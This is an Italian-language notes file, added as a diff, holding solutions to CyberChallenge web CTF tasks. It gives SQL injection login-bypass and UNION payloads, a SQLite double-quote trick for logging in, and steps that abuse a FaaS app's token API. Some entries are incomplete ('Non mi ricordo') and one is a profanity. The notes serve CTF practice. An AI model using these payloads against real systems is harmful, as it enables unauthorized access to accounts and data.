@@ -1,0 +1,47 @@
+-> WS_2.01 - SQL Injection tutorial - Level 1
+
+    SELECT * FROM login WHERE password = '' OR '1'='1'
+    ELECT * FROM login WHERE password = 'a' OR 1=1 #'
+    ELECT * FROM login WHERE password = 'a' OR 1=1 --
+    
+    a' OR 1=1 #'    [spoiler voleva solo la parte finale]
+
+-> WS_2.01 - SQL Injection tutorial - Level 2
+
+    ' UNION SELECT flag, 2, 3, 4, 5, 6 FROM real_data -- -
+
+-> WS_2.01 - SQL Injection tutorial - Level 3
+
+    python solve_WS_2.01.py
+
+-> WS_2.01 - SQL Injection tutorial - Level 4
+
+    Non mi ricordo
+
+-> WS_2.02 - filtered
+    
+    Non mi ricordo
+
+-> WS_2.03 - NoSQLInjection Here
+
+    In user.php noto:
+        $q = 'SELECT fancy_username,fancy_password FROM users WHERE fancy_username = "%s" AND fancy_password = "%s"';
+        $res = db::query($q, $username, $password);
+
+    Ecco cosa interpreta il motore di SQLite:
+        "admin" non è una colonna conosciuta, quindi la tratta come stringa letterale 'admin'.
+        "fancy_password" è un nome di colonna valido all'interno della tabella users!
+    
+    E inserendo queste credenziali riuscirai ad entrare da SignIn e leggere la flag
+
+-> WS_2.04 - yet another blog
+
+    PORCO DIO
+
+-> WS_2.05 - FaaS
+
+1. Registrati
+2. Apps > NomeACaso - Vault:bdc3e1e0-fa24-48fe-9f96-3c5390dbd842 (che è il bersaglio leggibile dalla home su getCLI) e fai create
+3. http://faas.challs.cyberchallenge.it/api/authorize/bab35eb9-0b36-4836-9521-40b50b3dc0a4 e prendi il token
+    [bab35eb9-0b36-4836-9521-40b50b3dc0a4 è l'id creato su apps]
+4. http://faas.challs.cyberchallenge.it/api/get_refresh/03f19f61-640e-496e-8f20-5331c521e340
